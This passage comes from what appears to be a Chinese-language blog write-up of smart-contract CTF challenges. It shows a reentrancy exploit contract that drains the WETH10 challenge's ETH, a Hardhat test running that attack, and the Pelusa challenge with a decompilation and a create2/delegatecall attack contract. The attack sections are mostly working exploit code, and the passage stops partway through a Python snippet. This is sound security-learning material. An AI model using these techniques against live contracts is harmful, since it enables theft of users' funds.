data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">WETH10Exploit</span> <span class=\"token punctuation\">&#123;</span>\n    WETH10 weth<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> bob<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span>WETH10 _weth10<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _bob<span class=\"token punctuation\">)</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        weth <span class=\"token operator\">=</span> _weth10<span class=\"token punctuation\">;</span>\n        bob <span class=\"token operator\">=</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>_bob<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">;</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>weth<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            weth<span class=\"token punctuation\">.</span>deposit<span class=\"token punctuation\">&#123;</span>value<span class=\"token punctuation\">:</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            weth<span class=\"token punctuation\">.</span><span class=\"token function\">withdrawAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            \n            <span class=\"token comment\">// Execution passes to weth10, which sends eth to address(this)</span>\n            <span class=\"token comment\">// triggering the receive() function</span>\n            \n            weth<span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>bob<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> bob<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">&#123;</span>value<span class=\"token punctuation\">:</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>success<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        weth<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>bob<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">\n<span class=\"token function\">describe</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"WETH10\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">async</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">let</span> owner<span class=\"token punctuation\">,</span>attacker<span class=\"token punctuation\">,</span>contract<span class=\"token punctuation\">,</span>data<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> Value <span class=\"token operator\">=</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"10\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">before</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">async</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token punctuation\">[</span>owner<span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getSigners</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        contract <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'WETH10'</span><span class=\"token punctuation\">,</span> owner<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">f</span> <span class=\"token operator\">=></span> f<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">deployed</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">await</span> <span class=\"token function\">setBalance</span><span class=\"token punctuation\">(</span>contract<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>Value<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">it</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"success\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">async</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// data = get_data(attacker.address);</span>\n        <span class=\"token comment\">// console.log(contract.address);</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span>contract<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span><span class=\"token function\">eq</span><span class=\"token punctuation\">(</span>Value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// start hack</span>\n        <span class=\"token keyword\">let</span> Exploit <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"WETH10Exploit\"</span><span class=\"token punctuation\">,</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">let</span> exploit <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> Exploit<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span>contract<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span>exploit<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span><span class=\"token function\">BigInt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">100e18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">await</span> <span class=\"token function\">setBalance</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">await</span> exploit<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token literal-property property\">value</span><span class=\"token operator\">:</span>ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// end</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span>contract<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span><span class=\"token function\">eq</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span><span class=\"token function\">gte</span><span class=\"token punctuation\">(</span>ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"11\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// await attContract.connect(attacker).pwn(contract.address);</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20230222125440088.png\"></p>\n<h1 id=\"0x08-Pelusa\"><a href=\"#0x08-Pelusa\" class=\"headerlink\" title=\"0x08 Pelusa\"></a>0x08 Pelusa</h1><h2 id=\"Code-7\"><a href=\"#Code-7\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.7</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">IGame</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getBallPossesion</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Pelusa</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">private</span> immutable owner<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">internal</span> player<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> goals <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        owner <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint160</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token function\">blockhash</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>number<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">passTheBall</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>code<span class=\"token punctuation\">.</span>length <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Only EOA players\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint160</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">100</span> <span class=\"token operator\">==</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"not allowed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        player <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">isGoal</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// expect ball in owners posession</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">IGame</span><span class=\"token punctuation\">(</span>player<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getBallPossesion</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> owner<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">shoot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">isGoal</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"missed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token comment\">/// @dev use \"the hand of god\" trick</span>\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> player<span class=\"token punctuation\">.</span><span class=\"token function\">delegatecall</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"handOfGod()\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>success<span class=\"token punctuation\">,</span> <span class=\"token string\">\"missed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">22</span>_06_1986<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyse-7\"><a href=\"#Analyse-7\" class=\"headerlink\" title=\"Analyse\"></a>Analyse</h2><p>第一题不是很难，先来捋一下考点，目标是<code>shoot()</code>成功一次。</p>\n<ul>\n<li><p>外部调用<code>getBallPossesion()</code>函数返回pelusa合约的owner值。（读取变量）</p>\n</li>\n<li><p>修改当前合约的player值。（constructor绕过EOA检测，create2跑出特殊地址）</p>\n</li>\n<li><p>向player进行delegatecall，要求调用成功，returndata数值大小等于22_06_1986。（外部调用）</p>\n</li>\n</ul>\n<p>owner使用了immutable存储方式，简单说一下和constant的区别，前者为不可变量，后者为常量，不遵守智能合约变量存储优化原则。constant不支持运行时赋值而immutable可以，值呗硬编码到bytecode之中，所以获得包邮特code再去decompile即可获得owner值</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20230126202610635.png\"></p>\n<p>拿到Code进行反编译，太长了直接上关键部分</p>\n<pre class=\"line-numbers language-assembly\" data-language=\"assembly\"><code class=\"language-assembly\">function func_01A8() returns (var r0) &#123;\n        var var0 &#x3D; 0x00;\n        var var1 &#x3D; 0xffffffffffffffffffffffffffffffffffffffff &amp; 0x00000000000000000000000045ba9924e7a4a9dfd99cd846bca2d34e28579f85;\n        var var2 &#x3D; storage[0x00] &amp; 0xffffffffffffffffffffffffffffffffffffffff;\n        var var3 &#x3D; 0xe09235ad;\n        var temp0 &#x3D; memory[0x40:0x60];\n        memory[temp0:temp0 + 0x20] &#x3D; (var3 &amp; 0xffffffff) &lt;&lt; 0xe0;\n        var var4 &#x3D; temp0 + 0x04;\n        var var5 &#x3D; 0x20;\n        var var6 &#x3D; memory[0x40:0x60];\n        var var7 &#x3D; var4 - var6;\n        var var8 &#x3D; var6;\n        var var9 &#x3D; var2;\n        var var10 &#x3D; !address(var9).code.length;\n    \n        if (var10) &#123; revert(memory[0x00:0x00]); &#125;\n    \n        var temp1;\n        temp1, memory[var6:var6 + var5] &#x3D; address(var9).staticcall.gas(msg.gas)(memory[var8:var8 + var7]);\n        var5 &#x3D; !temp1;\n    \n        if (!var5) &#123;\n            var temp2 &#x3D; memory[0x40:0x60];\n            var temp3 &#x3D; returndata.length;\n            memory[0x40:0x60] &#x3D; temp2 + (temp3 + 0x1f &amp; ~0x1f);\n            var2 &#x3D; 0x027f;\n            var4 &#x3D; temp2;\n            var3 &#x3D; var4 + temp3;\n            var2 &#x3D; func_049C(var3, var4);\n            return var2 &amp; 0xffffffffffffffffffffffffffffffffffffffff &#x3D;&#x3D; var1;\n        &#125; else &#123;\n            var temp4 &#x3D; returndata.length;\n            memory[0x00:0x00 + temp4] &#x3D; returndata[0x00:0x00 + temp4];\n            revert(memory[0x00:0x00 + returndata.length]);\n        &#125;\n    &#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>分析一下可以知道这个函数是<code>passTheBall()</code>函数，所以var1也就是owner值</p>\n<p>剩下的考点比较简单了，直接贴代码</p>\n<h2 id=\"Attack-7\"><a href=\"#Attack-7\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> target<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> p_owner<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _target<span class=\"token punctuation\">,</span><span class=\"token builtin\">address</span> _p_owner<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        target <span class=\"token operator\">=</span> _target<span class=\"token punctuation\">;</span>\n        p_owner <span class=\"token operator\">=</span> _p_owner<span class=\"token punctuation\">;</span>\n        <span class=\"token function\">Pelusa</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">passTheBall</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">handOfGod</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">bytes32</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x150a3a2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getBallPossesion</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> p_owner<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">pwn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">Pelusa</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">shoot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Deployer</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> a<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> bytecode<span class=\"token punctuation\">,</span><span class=\"token builtin\">uint</span> salt<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">address</span> addr<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">&#123;</span>\n          addr <span class=\"token operator\">:=</span> <span class=\"token function\">create2</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>bytecode<span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">mload</span><span class=\"token punctuation\">(</span>bytecode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> salt<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token keyword\">return</span> addr<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> code<span class=\"token punctuation\">,</span><span class=\"token builtin\">uint</span> salt<span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        a<span class=\"token operator\">=</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">,</span>salt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> web3 <span class=\"token keyword\">import</span> Web3<span class=\"token punctuation\">,</span>HTTPProvider\ntarget <span class=\"token operator\">=</span> pelusa\ndeployingaddr <span class=\"token operator\">=</span> deployer\ncode <span class=\"token operator\">=</span> attack<span class=\"token punctuation\">.</span>code\ncode <span class=\"token operator\">+=</span> target<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span><span class=\"token number\">64</span><span class=\"token punctuation\">,</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span>\ncode <span class=\"token operator\">+=</span> p_owner <span class=\"token keyword\">from</span> decompile\ns<span class=\"token operator\">=</span>Web3<span class=\"token punctuation\">.</span>keccak<span class=\"token punctuation\">(</span>hexstr<span class=\"token operator\">=</span>code<span class=\"token punctuation\">)</span>\na<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token 